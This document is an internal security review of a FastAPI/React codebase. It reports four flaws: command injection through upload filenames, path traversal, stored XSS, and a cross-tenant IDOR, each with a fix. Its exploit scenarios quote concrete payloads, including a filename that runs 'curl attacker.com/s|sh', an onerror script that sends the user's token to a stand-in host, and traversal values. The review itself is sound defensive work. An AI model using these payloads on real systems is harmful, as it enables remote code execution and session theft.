# Security Review — 2026-04-23

Scope: existing codebase on `main` at commit `4474393`. Focus: high-confidence, exploitable vulnerabilities in backend (FastAPI/Python) and frontend (React/TS).

## Summary

| # | Title | Severity | File |
|---|-------|----------|------|
| 1 | Authenticated RCE via Command Injection | High | [backend/app/api/upload.py](../backend/app/api/upload.py) |
| 2 | Path Traversal / Arbitrary File Write | High | [backend/app/api/upload.py](../backend/app/api/upload.py) |
| 3 | Stored XSS in Markdown Renderer | High | [frontend/src/components/MarkdownRenderer.tsx](../frontend/src/components/MarkdownRenderer.tsx) |
| 4 | Cross-Tenant IDOR → Account Takeover | High | [backend/app/api/organization.py](../backend/app/api/organization.py) |

---

## Vuln 1: Authenticated RCE via Command Injection

- **Location:** [backend/app/api/upload.py:46-59](../backend/app/api/upload.py#L46-L59), [69-79](../backend/app/api/upload.py#L69-L79), [88-103](../backend/app/api/upload.py#L88-L103)
- **Severity:** High
- **Category:** command_injection / code_injection

**Description.** The `/chat/upload` endpoint passes an attacker-controlled upload filename into a Python program executed via `subprocess.run(["python3", "-c", f"...'{file_path}'..."])`. `file_path` is derived from `UploadFile.filename` (saved at `uploads_dir / file.filename` with no sanitization) and substituted unescaped into a single-quoted Python string literal at lines 51, 57, 73, and 92. Although `shell=False` (argv form), an attacker supplies a filename containing a single quote to break out of the Python string literal and execute arbitrary Python. All three extraction branches (PDF, DOCX, XLSX/XLS) share the flaw.

**Exploit Scenario.** An authenticated user POSTs to `/api/chat/upload` with a multipart file whose filename is e.g. `foo.pdf');__import__('os').system('curl attacker.com/s|sh');#`. The file is saved with that literal name on disk. The backend then runs `python3 -c "import PyPDF2; ... PdfReader('<uploads>/foo.pdf');__import__('os').system('curl attacker.com/s|sh');#')..."` — the injected payload runs as the backend process user, yielding full RCE on the host.

**Recommendation.** Do not construct Python code via string interpolation. Either import the extraction libraries in-process, or pass the path as an argv argument to a dedicated extractor script and read it via `sys.argv[1]`. Additionally sanitize `file.filename` (strip path separators, quotes, control characters) and whitelist a safe character set.

---

## Vuln 2: Path Traversal / Arbitrary File Write

- **Location:** [backend/app/api/upload.py:121-140](../backend/app/api/upload.py#L121-L140)
- **Severity:** High
- **Category:** path_traversal

**Description.** The `/chat/upload` handler builds `save_path = WORKSPACE_ROOT / agent_id / "workspace" / "uploads" / file.filename` with no validation. `agent_id` is an unvalidated `Form("")` string (no UUID parsing, no `check_agent_access`, unlike every handler in [backend/app/api/files.py](../backend/app/api/files.py) which applies `_safe_path`). `file.filename` is used verbatim — the sibling sanitizer `filename.replace("/", "_")` from [backend/app/api/files.py:281](../backend/app/api/files.py#L281) is absent. `pathlib`'s `/` operator does not normalize, so `..` segments and absolute paths traverse out of the workspace root, and `mkdir(parents=True, exist_ok=True)` + `write_bytes(content)` yield arbitrary file write as the backend user.

**Exploit Scenario.** Any authenticated user sends `agent_id=../../../tmp` (or `filename=../../../../tmp/pwn`) and arbitrary content. The server creates intermediate directories and writes attacker-controlled bytes outside the agent workspace — enabling cross-tenant data poisoning for LLM context injection, overwriting other agents' workspaces, or dropping files into sensitive locations the backend user can reach (e.g., systemd units, cron files, SSH authorized_keys in containerized deployments). Chained with Vuln 1 it guarantees RCE without needing to discover an agent ID.

**Recommendation.** Parse `agent_id` as `uuid.UUID`, call `check_agent_access(db, current_user, agent_uuid)`, resolve the final path via `.resolve()`, and assert `str(resolved).startswith(str(uploads_dir.resolve()) + os.sep)` before any `mkdir`/`write_bytes`. Sanitize the filename with `os.path.basename` plus the `replace("/", "_").replace("\\", "_")` pattern used in [backend/app/api/files.py:281](../backend/app/api/files.py#L281).

---

## Vuln 3: Stored XSS in Markdown Renderer

- **Location:** [frontend/src/components/MarkdownRenderer.tsx:16-54](../frontend/src/components/MarkdownRenderer.tsx#L16-L54), [112](../frontend/src/components/MarkdownRenderer.tsx#L112), [180](../frontend/src/components/MarkdownRenderer.tsx#L180), [204](../frontend/src/components/MarkdownRenderer.tsx#L204)
- **Severity:** High
- **Category:** xss

**Description.** The custom `markdownToHtml` pipeline concatenates user-controlled strings directly into an HTML string and emits it via `dangerouslySetInnerHTML` (line 204). Only fenced code blocks are HTML-escaped (lines 88, 186); regular paragraphs, headings, lists, blockquotes, and tables pass through `renderInline`, which does not escape `<`, `>`, `&`, or `"` before concatenation. Link/image URLs are substituted unescaped into `href="${finalUrl}"` / `src="${finalUrl}"` (lines 37, 50), allowing `javascript:` schemes and attribute breakouts. The component is used for assistant chat messages ([frontend/src/pages/Chat.tsx:866](../frontend/src/pages/Chat.tsx#L866), [frontend/src/pages/AgentDetail.tsx:2252](../frontend/src/pages/AgentDetail.tsx#L2252)) and for rendering arbitrary `.md` workspace files ([frontend/src/components/FileBrowser.tsx:403](../frontend/src/components/FileBrowser.tsx#L403), [frontend/src/components/FileBrowser.tsx:459](../frontend/src/components/FileBrowser.tsx#L459)). The auth token is kept in `localStorage`, so XSS is directly account-takeover.

**Exploit Scenario.** A collaborator on a shared agent writes `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">` into a workspace `.md` file (or induces the assistant to echo the raw HTML verbatim). When another collaborator opens that file or views the chat history, the browser executes the injected script and exfiltrates the victim's JWT, yielding full session hijack. IM integrations (Feishu/WeCom) that ingest external messages expand the reach beyond authenticated collaborators.

**Recommendation.** Replace the hand-rolled parser with `react-markdown` (no `rehype-raw`) or pipe the output of an established Markdown library through DOMPurify before `dangerouslySetInnerHTML`. At minimum: HTML-escape all unmatched text runs inside `renderInline`, escape `href`/`src`/alt/title values, and validate URL schemes against an `http(s):` / relative allowlist rejecting `javascript:`, `data:`, and `vbscript:`.

---

## Vuln 4: Cross-Tenant IDOR → Account Takeover

- **Location:** [backend/app/api/organization.py:45-106](../backend/app/api/organization.py#L45-L106)
- **Severity:** High
- **Category:** authorization_bypass / idor

**Description.** `PATCH /org/users/{user_id}` is guarded by `get_current_admin`, which per [backend/app/core/security.py:180-184](../backend/app/core/security.py#L180-L184) accepts both `platform_admin` and `org_admin`. The handler fetches the target user by primary key only and never checks `user.tenant_id == current_user.tenant_id`. The mutable fields (`email`, `username`, `primary_mobile`) are `association_proxy` attributes on `User` that write through to the **global** `Identity` row, which is the authentication root shared across tenants. The sibling `GET /org/users?tenant_id=<other>` handler at lines 21-42 also accepts a `tenant_id` query parameter from non-platform admins, letting an attacker enumerate victim UUIDs.

**Exploit Scenario.** An `org_admin` of tenant A lists users in tenant B (`GET /org/users?tenant_id=B`), then PATCHes a target user's `email` to an attacker-controlled address. They then call `/auth/forgot-password` ([backend/app/api/auth.py:586-635](../backend/app/api/auth.py#L586-L635)) which resolves by Identity email, receive the reset token, and take over the victim's account globally — across every tenant the Identity is attached to. Per-tenant uniqueness checks at lines 65-90 are scoped to the target user's tenant, so they do not block cross-tenant writes.

**Recommendation.** In `admin_update_user`, after loading the user, enforce `if current_user.role != "platform_admin" and user.tenant_id != current_user.tenant_id: raise HTTPException(404)`. Apply the same guard to `list_users` when a non-platform caller supplies `tenant_id`. Consider removing Identity-level fields (email/username/phone) from the tenant admin endpoint altogether, since they govern global authentication rather than tenant-scoped profile data.
